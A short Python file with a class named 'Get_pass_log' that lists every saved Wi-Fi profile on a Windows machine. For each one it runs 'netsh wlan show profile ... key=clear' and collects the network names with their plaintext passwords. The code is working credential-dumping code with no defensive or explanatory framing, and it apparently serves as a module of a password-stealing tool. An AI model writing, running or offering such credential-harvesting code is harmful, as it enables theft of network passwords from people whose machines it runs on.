import subprocess

class Get_pass_log:

    def get_wifi(self):
        lst = []
        profiles_slv = subprocess.check_output('netsh wlan show profiles').decode('utf-8').split('\n')

        profiles = [i.split(':')[1].strip() for i in profiles_slv if 'All User Profile' in i]


        for i in profiles:
            profiles_info = subprocess.check_output(f'netsh wlan show profile {i} key=clear').decode('utf-8').split('\n')

            try:
                password = [i.split(':')[1].strip() for i in profiles_info if 'Key Content' in i][0]
            except IndexError:
                password = None


            message = (i,password)
            for i in message:
                lst.append(i)
        return lst
